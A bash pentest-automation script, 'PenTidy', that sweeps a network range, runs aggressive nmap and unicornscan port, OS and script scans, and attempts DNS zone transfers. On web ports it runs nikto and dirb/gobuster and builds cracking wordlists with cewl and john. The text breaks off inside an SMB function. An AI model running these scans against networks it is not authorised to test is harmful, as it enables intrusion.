#!/bin/bash
# PenTidy - rijidpish 2018 - you can beat an egg...

### DOES ###
# Creates a structured and consistent working directory for pentest notes (the way i like to structure them)
# Creates some empty template files (notes.txt, proof.txt etc)
# Finds active hosts within a specified range
# Creates target folders as per active host found
# Finds open ports and then runs a series of scans on each open port found (Version, OS Detection, Default Scripts, Safe Scripts)
# Performs basic DNS lookup on range (if domain is specified)
# If default web ports are found, performs dirb/gobuster, nikto, cewl + rules
# Creates a new metasploit workspace and imports network scans into it
# Creates a few standard payloads (popcalc/rev/bind), without common bad characters (e.g: x00\x0d\x0a etc)
# Creates a few reverse shell 'one-liners' based on the current local IP and specified port
# Download template report and autofill based on various variables - PARTIALLY COMPLETE
# If hostname is found, append to the folder name in uppercase (targets/192.168.1.1-RT-AC5300) - see hostname_lookup function!
# Sets up a custom tmux session with all targets found
# Logs all output to file

### TODO/FIXME/XXX ###
# Add more specific scans, when finding default open ports (enum4linux when finding 137, 139 or 455 etc), (nmap http-vuln* for 80/443 etc) - PARTIALLY COMPLETE
# Also add in  my super awesome samba version grabber one liner, * uses smbclient and tshark
# Create a generic list of (more intensive) recommended tools and scans to try after (nmap, dirb etc) with IP etc prefilled of course ;D TODO
# Better still... Go over all ports found and check banner/response, then if it's a web server etc, run web scans - TOO MUCH WORK INVOLVED for my lonesome
# Fix the order of specified interface and hostname, so that the interface is always set before the target ip/range? XXX
# Add option to use custom list of hosts - would need to be set with a flag + argument and to check for it in the network sweep function perhaps?
# Change the default screenshot path to be that of this job - PARTIALLY COMPLETE - buggy?!
# Add the command used to the 1st line of all output files (nmap already does this)
# Re-visit template folders and files, rename overall payloads folder or move it into reference folder?
# Add masscan to find all open ports - SUPER FAST!!! but also flaky as fuck!!!!!! I got 99 problems and masscan is every one !!!!!!!!!!! masscan -p1-500 192.168.1.15 -e eth0 -oL open_tct_ports.lst -v --rate=400
# If atom is installed, add machines path as a project folder "atom -a $custom_path$client_name"?
# Could prolly reduce this script down to half it's size if i learned to use functions proper...

### DEBUG ###
#set -x #
#set -u #
#set -e #
#set -eo pipefail
#set -Eexuo pipefail
#set -o history

### VARIABLES ###
script_version="1.0" # -v flag
right_now_filename="$(date +'%d-%m-%Y-%H-%M-%S')"
right_now_human="$(date)"
network_interface="eth0" # default value, can be changed using arguments
local_ip="$(ip address show $network_interface | grep "inet " | cut -d " " -f 6 | cut -d "/" -f 1)"
#public_ip="$(dig +short myip.opendns.com @resolver1.opendns.com)" # might be useful at some point
local_network_range="$(ip address show $network_interface | grep "inet " | cut -d " " -f 6)"
target_range="$local_network_range" # default value, can be changed using arguments
client_name="pentidy_scan-$(date +'%d-%m-%Y-%H-%M')" # default value, can be changed using arguments
custom_path="$HOME$(case $HOME in */);; *) echo "/";; esac)" # default value, can be changed using arguments, checks for a trailing slash, if not found, adds one!
log_path=".$client_name.log" # default log filename & path

### TUNING ###
script_timeout="--script-timeout 30s" # remove for defaults: --script-timeout 30s for testing
top_ports_tcp="65535" # between 1 - 65535, default 1000
top_ports_udp="65535" # between 1 - 65535, default 500
unicorn_ports_tcp="1-65535" # 1-65535
unicorn_ports_udp="1-65535" # 1-65535
#masscan_ports_tcp="1-65535" # 1-65535
#masscan_ports_udp="1-65535" # 1-65535
#masscan_rate="--rate=1000" # wouldn't advise going any faster than 1000...
scan_speed="-T5" # only applies to nmap scanning, use: -T0, -T1, -T2, -T3, -T4 or -T5 (Paranoid, Sneaky, Polite, Normal/Default, Aggressive, Insane)
nmap_oscp_tweak="--min-rtt-timeout 250ms" # OSCP/PWK may need '--min-rtt-timeout 250ms' (if you live in oz, or have dogshit internet connection), leave variable empty if your one of the lucky ones
bad_chars="\x00\x0a\x0d" # TODO specify bad chars as an argument (-B?)
shell_port="6183" # TODO specify port to be used for generated shells and payloads (-P?)
ip_omit="192.168.5.254" # Used mainly to omit the VMware DHCP server IP when scanning a host-only network range with DHCP enabled (192.168.5.254 in my case) as it takes ages to scan
buster_wordlist="/usr/share/dirb/wordlists/common.txt" # wordlist to use with dirb (defaults: small.txt / common.txt / big.txt)
buster_extensions_path="/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions.txt" # "/dev/null" # If you have lots of time: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions.txt
dirb_extensions="" # "-X $buster_extensions_path" 
gobuster_extensions="" # -x $(cat $buster_extensions_path | tr "\n" ",") # as gobuster doesnt seem to support extension files directly, we do some inline parsing
gobuster_threads="-t 20" # default: -t 10
nikto_timeout="-timeout 5" # Adjust depending on network speed, if fast: "-timeout 1", slow: "-timeout 10"
sleeps="sleep 0.1" # default: sleep 0.1 # I like sleeps!
tmux_status_bg_color="colour166"
tmux_status_fg_color="default"

### FLAGS ### Used to enable/disable features via optargs
domain="" # disabled by default, if empty, dns scan is skipped, enabled when -d <domain> parameter is used or variable is hard-coded
enable_unicorn="" # disabled by default, if -u flag is set, unicornscan is used instead of nmap for initial port scan
#enable_masscan="" # disabled by default, if -m flag is set, masscan is used instead of nmap for initial port scan
enable_tmux="" # disabled by default, if -T flag is set, a tmux session will be setup in the final stages
force="" # disabled by default
enable_report="" # disabled by default
dubdub_buster="" # dirb used by default, if -g flag is used, gobuster will be used instead
verbose="" # disabled by default, if -v is used, some commands are displayed, wrap all useful commands in varibale called $current_command, then call with verbose_command() "if [ -z $verbose ]; then echo "Verbosa no asky!" &> /dev/null; else echo $txtyel"$current_command"$txtrst; fi"

verbose_command() # each command should be stored in a variable and then run: current_command="COMMAND TO RUN"; verbose_command; $current_command
{
	if [ -z $verbose ]; then
		echo "Verbosa no asky!" &> /dev/null
	else
		echo $txtyel"$current_command"$txtrst
	fi
}

### FORMATTING ###

# Using ANSI escape sequences as tput didn't work well with tmux :(

txtrst=$(echo -en '\033[0m')
txtbld=$(echo -en '\033[1m')
txtgry=$(echo -en '\033[00;90m')
txtlgr=$(echo -en '\033[01;90m')
txtred=$(echo -en '\033[00;31m')
txtgrn=$(echo -en '\033[00;32m')
txtyel=$(echo -en '\033[00;33m')
txtblu=$(echo -en '\033[00;34m')
txtchk=$(printf \\u2714) # ✔
txtcro=$(printf \\u2716) # ✖

### FUNCTIONS ###

# Show usage for command line arguments
show_usage()
{
	$sleeps
	echo $txtblu"Usage: $txtgry$0 <args>"$txtrst
	echo $txtblu"Example: $txtgry$0 -i tap0 -t 10.11.1.0/24 -d feck.local -p Desktop -c feck-lab"$txtrst # currently, it matters which way around the -i and -t arguments are positioned (-i has to be first in some cases when specify both)! FIXME
	echo ""
}

# Show help for command line arguments
show_help()
{
	$sleeps
	echo $txtblu" -c $txtgry ---- $txtblu Set client/job name $txtgry(default: $client_name)$txtblu"
	echo " -d $txtgry ---- $txtblu Set domain name $txtgry(default: NOT SET)$txtblu"
	echo " -g $txtgry ---- $txtblu Use gobuster scan instead of dirb"
	echo " -h $txtgry ---- $txtblu Show this chuff and exit"
	echo " -i $txtgry ---- $txtblu Set network interface $txtgry(default: eth0)$txtblu"
	echo " -p $txtgry ---- $txtblu Set a specific path to save the working environment $txtgry(default: $custom_path)$txtblu"
	echo " -r $txtgry ---- $txtblu Run with default settings"
	echo " -t $txtgry ---- $txtblu Set target or range to scan $txtgry(single IP, /24 or 1-255 valid, default: $local_network_range)$txtblu"
	echo " -u $txtgry ---- $txtblu Use unicorn scan for finding open ports (Don't use on HTB!)"
#	echo " -m $txtgry ---- $txtblu Use masscan for finding open ports - SUPER FAST!"
	echo " -V $txtgry ---- $txtblu Show version and exit"
	echo " -F $txtgry ---- $txtblu Do not prompt, just get shit done!"
	echo " -O $txtgry ---- $txtblu Omit IP address from scan (default: 192.168.5.254)"
	echo " -T $txtgry ---- $txtblu When finished, start a tmux session with sexy panes n shiz"
	echo " -R $txtgry ---- $txtblu Download a pre-filled report template from GitHub? (This will be populated with some results)"
	echo " -v $txtgry ---- $txtblu Verbose mode (display commands)"$txtrst
	echo ""
	echo $txtgry"NOTE: You MUST set the interface before the target range when specifying both arguments"$txtrst
	echo ""
	$sleeps
	show_local_ip
	$sleeps
	list_interfaces
	$sleeps
}

# If confirmation is required, use this function
continue_quit()
{
	while true; do
		echo -n $txtblu$txtbld"[?] Continue? (Yes or No) "$txtrst$txtgry
		read yes_no
		case $yes_no in
			 [yY][eE][sS]|[yY])
				$sleeps
				echo $txtgry"    ...On we go!"
				$sleeps
				break
				;;
			 [nN][oO]|[nN])
				$sleeps
				echo $txtgry"...Quitting!"
				$sleeps
				echo ""
				exit 1
				;;
			*)
				echo $txtgry"[!] It's quite simple...$txtbld yes$txtrst$txtgry or$txtbld no"$txtrst
				continue
				;;
		esac
	done
}

# List network interfaces
list_interfaces()
{
	echo "$txtblu[i] Current network interfaces:"
	$sleeps
	echo $txtyel"$(ip address | grep "<" | grep -v "lo" | cut -d " " -f 2 | tr -d [=:=] | sort)"$txtrst
	echo ""
}

#just show the IP
show_local_ip()
{
	echo "$txtblu[i] Current IP address is:"
	$sleeps
	echo "$txtyel$(ip address show $network_interface | grep "inet " | cut -d " " -f 6 | cut -d "/" -f 1)"$txtrst
	echo ""
}

check_dependancies()
{
	$sleeps
	echo $txtblu$txtbld"[!] Checking Dependancies"$txtrst
	$sleeps
	if command -v nmap >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  nmap has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  nmap is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install nmap -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v unicornscan >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  unicornscan has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  unicornscan is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install unicornscan -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v masscan >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  masscan has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  masscan is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install masscan -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v fping >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  fping has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  fping is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install fping -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v psql >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  postgresql has been located"$txtrst
	else
		echo -n " $txtred$txtcro$txtblu  postgresql is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install postgresql -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v msfconsole >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  msfconsole has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  msfconsole is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install metasploit-framework -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v nikto >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  nikto has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  nikto is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install nikto -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v dirb >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  dirb has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  dirb is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install dirb -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v cewl >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  cewl has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  cewl is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install cewl -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v john >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  john has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  john is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install john -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v gobuster >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  gobuster has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  gobuster is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install gobuster -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v enum4linux >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  enum4linux has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  enum4linux is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install enum4linux -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v xmllint >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  xmllint has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  xmllint is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install libxml2-utils -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
	if command -v tmux >/dev/null 2>&1; then
		echo " $txtgrn$txtchk$txtgry  tmux has been located"$txtrst
		$sleeps
	else
		echo -n " $txtred$txtcro$txtblu  tmux is not installed, download and install it using apt? (Yes or No): "$txtrst$txtgry
		read confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  		apt update && apt install tmux -y
		echo ""
		if [ $? -ne 0 ]
		then
			:
		else
			exit 1
		fi
	fi
}

# Display banner
banner()
{
	$sleeps
	echo "$txtblu$txtbld-----------------------------------------------------"
	echo $txtrst$txtblu"PenTidy                   rijidpish 2018 - PID:$txtyel $$ $txtblu$txtbld"
	echo "-----------------------------------------------------$txtrst"
}

# Perform nmap sweep of target range, pop into a list of active ip addresses for further scans
# does a ping sweep followed by super quick nmap port scan, sorts addresses into a list of found IP addresses
network_sweep()
{
	echo $txtblu$txtbld"[+] Performing ping/network sweep, this may take some time"$txtrst$txtyel
	fping -g $target_range 2>&1 | grep "is alive" | cut -d " " -f 1 > $custom_path$client_name/network_scans/found_ips.lst
	nmap $target_range -e $network_interface --top-ports 10 $scan_speed $nmap_oscp_tweak -n -oA $custom_path$client_name/network_scans/found_ips &> /dev/null # may need to tweak the scan speed, especially for the OSCP (-T2)
	grep "/open/\|/closed/\|/filtered/" $custom_path$client_name/network_scans/found_ips.gnmap | cut -d " " -f 2 >> $custom_path$client_name/network_scans/found_ips.lst #&> /dev/null
	sort -uV $custom_path$client_name/network_scans/found_ips.lst -o $custom_path$client_name/network_scans/found_ips.lst
	if grep $local_ip $custom_path$client_name/network_scans/found_ips.lst &> /dev/null; then
		echo $txtgry" -  Removing our own IP: $txtlgr$local_ip$txtgry from list"$txtrst
		sed -i "/\<$local_ip\>/d" $custom_path$client_name/network_scans/found_ips.lst # removing our own IP if found in range
	fi
	if grep $ip_omit $custom_path$client_name/network_scans/found_ips.lst &> /dev/null; then
		echo $txtgry" -  Removing custom IP: $txtlgr$ip_omit$txtgry from list"$txtrst
		sed -ri "/\<$ip_omit\>/d" $custom_path$client_name/network_scans/found_ips.lst # remove custom IP address from list, useful for testing in a host only lab setup
		$sleeps
	fi
	echo $txtblu"[i] $(wc -l $custom_path$client_name/network_scans/found_ips.lst | cut -d " " -f 1) total target(s) found"$txtrst
	for found_ip in $(cat $custom_path$client_name/network_scans/found_ips.lst); do
		echo $txtgry" -  $txtyel$found_ip"$txtrst
		$sleeps
	done
	# Canne do nowt if we canne find neh targets, quit or delete and quit
	if [ ! -s $custom_path$client_name/network_scans/found_ips.lst ]; then
		echo $txtblu"[!] No targets found, would you like to delete the progress so far?"$txtrst
		continue_quit
		echo $txtgry" -  Removing $custom_path$client_name"$txtrst
		rm -rf $custom_path$client_name
		echo $txtgry" -  Quitting!"$txtrst
		exit 1
	fi
}

# must be called at the end as it makes changes to target folder names - afterthought :S
hostname_lookup()
{
	# If we find any hostnames using nslookup or nmap, append the hostname to the target directory
	echo $txtblu$txtbld"[i] Looking for hostnames"$txtgry
	for target in $(cat $custom_path$client_name/network_scans/found_ips.lst); do
		if command -v xmllint > /dev/null; then
			if [[ $(ls $custom_path$client_name/targets/$target/scans/nmap/*.xml 2> /dev/null) ]]; then # check if there are any .xml files in the folder
				ns="$(for i in $(ls $custom_path$client_name/targets/$target/scans/nmap/*.xml); do xmllint --xpath 'string(//@hostname)' $i; echo; done | awk '{print toupper($0)}' | sort -u | tr -d "\n" | cut -d " " -f 1)" # sometimes nmap finds hostname in lower and uppercase which messes with things
			fi
		else
			ns="$(nslookup $target | grep name | cut -d "=" -f 2 | sort -u | tr -d "[:space:]" | sed s'/.$//')"
		fi
		if [ ! -z "$ns" ]; then
			mv $custom_path$client_name/targets/$target $custom_path$client_name/targets/$target-$ns
			echo $txtgry" -  Found hostname $txtlgr$ns$txtgry for target IP $txtlgr$target$txtgry... updating folder name"$txtrst
			$sleeps
		else
			echo $txtgry" -  No hostname found for $txtlgr$target"$txtrst
			$sleeps
		fi
	done
}

# must be called after network_sweep / build_env
pick_lick_roll_flick_tcp()
{
	echo $txtblu$txtbld"[i] Detecting open TCP ports and running a series of network scans"$txtrst$txtgry
	for ip_address in $(cat $custom_path$client_name/network_scans/found_ips.lst); do
		if [ -z "$enable_unicorn" ] # use -u to enable unicornscan for TCP, otherwise it defaults to nmap scan
		then
			echo $txtblu"[i] Finding nmap top $top_ports_tcp open TCP ports for $ip_address"$txtgry
			nmap $ip_address -e $network_interface $scan_speed $nmap_oscp_tweak -n -Pn --top-ports $top_ports_tcp -oA $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports
			grep "open " $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.nmap | cut -d "/" -f 1 > $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst
		else
			echo $txtblu"[i] Finding all open TCP ports for $ip_address - using unicorn scan! No output for a while..."$txtyel
			unicornscan -i $network_interface $ip_address -p $unicorn_ports_tcp -m T | grep open | cut -d "[" -f 2 | cut -d "]" -f 1 | sed 's/ //g' | tee $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst
		fi
		if [ -s $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst ]
		then
			echo $txtblu"[i] Running nmap version scan on discovered TCP ports for $ip_address"$txtgry
			nmap $ip_address -e $network_interface -Pn -sV $scan_speed $nmap_oscp_tweak -p $(cat $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst | tr "\n" ",") -oA $custom_path$client_name/targets/$ip_address/scans/nmap/nmap-version-tcp
			echo $txtblu"[i] Running nmap os detection on discovered TCP ports for $ip_address"$txtgry
			nmap $ip_address -e $network_interface -Pn -O $scan_speed $nmap_oscp_tweak -p 1-100,$(cat $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst | tr "\n" ",") -oA $custom_path$client_name/targets/$ip_address/scans/nmap/nmap-os-tcp # needs to find at least one open and one closed port, 1-100 gives it what it wants, but get a coffee or Jolt anyway! ;)
			echo $txtblu"[i] Running nmap default scripts scan on discovered TCP ports for $ip_address"$txtgry
			nmap $ip_address -e $network_interface $script_timeout -Pn -sV -n -sC $scan_speed $nmap_oscp_tweak -p $(cat $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst | tr "\n" ",") -oA $custom_path$client_name/targets/$ip_address/scans/nmap/nmap-default-scripts-tcp
		else
			echo $txtgry"[!] No open TCP ports found for $ip_address!"$txtrst
			rm $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst
			$sleeps
		fi
	done
}

pick_lick_roll_flick_udp()
{
	echo $txtblu$txtbld"[i] Detecting open UDP ports and running a series of network scans"$txtrst$txtgry
	for ip_address in $(cat $custom_path$client_name/network_scans/found_ips.lst); do
		if [ -z "$enable_unicorn" ] # use -u to enable unicornscan for UDP, otherwise it defaults to nmap scan
		then
			echo $txtblu"[i] Finding nmap top $top_ports_udp open UDP ports for $ip_address"$txtgry
			nmap $ip_address -sU -e $network_interface -n -Pn $scan_speed $nmap_oscp_tweak --top-ports $top_ports_udp -oA $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports
			grep "open " $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.nmap | cut -d "/" -f 1 > $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst
		else
			echo $txtblu"[i] Finding all open UDP ports for $ip_address - using unicorn scan! No output for a while..."$txtyel
			unicornscan -i $network_interface $ip_address -p $unicorn_ports_udp -m U | grep "open" | cut -d "[" -f 2 | cut -d "]" -f 1 | sed 's/ //g' | tee $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst
		fi
		if [ -s $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst ]
		then
			echo $txtblu"[i] Running nmap version scan on discovered UDP ports for $ip_address"$txtgry
			nmap $ip_address -e $network_interface -sU -Pn -sV $scan_speed $nmap_oscp_tweak -p $(cat $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst | tr "\n" ",") -oA $custom_path$client_name/targets/$ip_address/scans/nmap/nmap-version-udp
			echo $txtblu"[i] Running nmap default scripts on discovered UDP ports for $ip_address"$txtgry
			nmap $ip_address -e $network_interface $script_timeout -sU -sV -Pn -n -sC $scan_speed $nmap_oscp_tweak -p $(cat $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst | tr "\n" ",") -oA $custom_path$client_name/targets/$ip_address/scans/nmap/nmap-default-scripts-udp
		else
			echo $txtgry"[!] No open UDP ports found for $ip_address!"$txtrst
			rm $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst
			$sleeps
		fi
	done
}

# Perform DNS lookup
dns_scan()
{
	if [ -z "$domain" ]; then
		echo $txtblu$txtbld"[!] No domain specified, skipping DNS lookup!"$txtrst &> /dev/null
		$sleeps
	else
		echo $txtblu$txtbld"[+] DNS scan for $domain on all active hosts discovered, this may take some time :)"$txtyel
		for server in $(cat $custom_path$client_name/network_scans/found_ips.lst); do
			host -l $domain $server 2>&1; done | grep "has address" | tee $custom_path$client_name/network_scans/dnsscan.lst
		if [ -s $custom_path$client_name/network_scans/dnsscan.lst ]; then
			echo $txtblu"[i] DNS server found, check file://$custom_path$client_name/network_scans/dnsscan.lst"$txtgry
			$sleeps
		else
			echo $txtgry"[!] No DNS server found!"$txtrst
			rm $custom_path$client_name/network_scans/dnsscan.lst
			$sleeps
		fi
	fi
}

web_scan()
{
# Must be performed after network_sweep and port scan
	echo $txtblu$txtbld"[i] Running web scans on default ports"$txtrst$txtgry
	for ip_address in $(cat $custom_path$client_name/network_scans/found_ips.lst); do
		if [ ! -f $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst ]; then
			echo $txtgry"[!] No open TCP ports found for $ip_address, skipping web scans"$txtrst
			$sleeps
		else
			if grep -w -q "80" $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst; then
				echo $txtblu"[i] Running nikto scan on TCP port 80 for $ip_address, press 'q' to skip"$txtgry
				nikto -host $ip_address -port 80 $nikto_timeout -ask no | tee $custom_path$client_name/targets/$ip_address/scans/web/nikto-80.txt # could try using "-Option PROMPTS=no" to override the config file instead of "-ask no"...? XXX
				if [ ! -z "$dubdub_buster" ]
				then
					echo $txtblu"[i] Running gobuster scan on TCP port 80 for $ip_address"$txtgry
					gobuster -u http://$ip_address:80 -w $buster_wordlist -e $gobuster_extensions $gobuster_threads | tee $custom_path$client_name/targets/$ip_address/scans/web/gobuster-80.txt
				else
					echo $txtblu"[i] Running dirb scan on TCP port 80 for $ip_address"$txtgry
					dirb http://$ip_address:80 $buster_wordlist $dirb_extensions -o $custom_path$client_name/targets/$ip_address/scans/web/dirb-80.txt
				fi
				echo $txtblu"[i] Running cewl scan on TCP port 80 for $ip_address"$txtgry
				cewl http://$ip_address --write $custom_path$client_name/targets/$ip_address/scans/web/cewl-80.lst -v &> /dev/null
				if [ -s $custom_path$client_name/targets/$ip_address/scans/web/cewl-80.lst ]
					then
						echo $txtblu"[+] Applying rules to list using default john rules"$txtgry
						john --wordlist:$custom_path$client_name/targets/$ip_address/scans/web/cewl-80.lst --rules --stdout > $custom_path$client_name/targets/$ip_address/scans/web/cewl-80-john-rules.lst 2> /dev/null
						echo $txtgry" -  $(wc -l $custom_path$client_name/targets/$ip_address/scans/web/cewl-80-john-rules.lst | cut -d " " -f 1) words added to custom wordlist for $ip_address"$txtgry
						$sleeps
					else
						echo $txtgry"[!] No words found for $ip_address!"$txtrst
						rm $custom_path$client_name/targets/$ip_address/scans/web/cewl-80.lst
						$sleeps
				fi
			fi
			if grep -w -q "443" $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst; then
				echo $txtblu"[i] Running nikto scan on TCP port 443 for $ip_address, press 'q' to skip"$txtgry
				nikto -host https://$ip_address -port 443 -ssl $nikto_timeout -ask no | tee $custom_path$client_name/targets/$ip_address/scans/web/nikto-443.txt
				if [ ! -z "$dubdub_buster" ]
				then
					echo $txtblu"[i] Running gobuster scan on TCP port 443 for $ip_address"$txtgry
					gobuster -u https://$ip_address:443 -w $buster_wordlist -e $gobuster_extensions -k $gobuster_threads | tee $custom_path$client_name/targets/$ip_address/scans/web/gobuster-443.txt
				else
					echo $txtblu"[i] Running dirb scan on TCP port 443 for $ip_address"$txtgry
					dirb https://$ip_address:443 $buster_wordlist $dirb_extensions -o $custom_path$client_name/targets/$ip_address/scans/web/dirb-443.txt
				fi
				echo $txtblu"[i] Running cewl scan on TCP port 443 for $ip_address"$txtgry
				cewl https://$ip_address:443 --write $custom_path$client_name/targets/$ip_address/scans/web/cewl-443.lst -v &> /dev/null
				if [ -s $custom_path$client_name/targets/$ip_address/scans/web/cewl-443.lst ]
					then
						echo $txtblu"[+] Applying rules to list using default john rules"$txtgry
						john --wordlist:$custom_path$client_name/targets/$ip_address/scans/web/cewl-443.lst --rules --stdout > $custom_path$client_name/targets/$ip_address/scans/web/cewl-443-john-rules.lst 2> /dev/null
						echo $txtgry" -  $(wc -l $custom_path$client_name/targets/$ip_address/scans/web/cewl-443-john-rules.lst | cut -d " " -f 1) words added to custom wordlist for $ip_address"$txtgry
						$sleeps
					else
						echo $txtgry"[!] No words found for $ip_address!"$txtrst
						rm $custom_path$client_name/targets/$ip_address/scans/web/cewl-443.lst
						$sleeps
				fi
			fi
			if grep -w -q "8443" $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst; then
				echo $txtblu"[i] Running nikto scan on TCP port 8443 for $ip_address, press 'q' to skip"$txtgry
				nikto -host https://$ip_address -port 8443 -ssl $nikto_timeout -ask no | tee $custom_path$client_name/targets/$ip_address/scans/web/nikto-8443.txt
				if [ ! -z "$dubdub_buster" ]
				then
					echo $txtblu"[i] Running gobuster scan on TCP port 8443 for $ip_address"$txtgry
					gobuster -u https://$ip_address:8443 -w $buster_wordlist -e $gobuster_extensions $gobuster_threads | tee $custom_path$client_name/targets/$ip_address/scans/web/gobuster-8443.txt
				else
					echo $txtblu"[i] Running dirb scan on TCP port 8443 for $ip_address"$txtgry
					dirb https://$ip_address:8443 $buster_wordlist -o $custom_path$client_name/targets/$ip_address/scans/web/dirb-8443.txt
				fi
			fi
		fi
	done
}

smb_enum()
{
	for ip_address in $(cat $custom_path$client_name/network_scans/found_ips.lst); do
    	echo $txtblu$txtbld"[i] Performing SMB enumeration for $ip_address"$txtrst
		if [ ! -f $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst ] && [ ! -f $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst ]; then
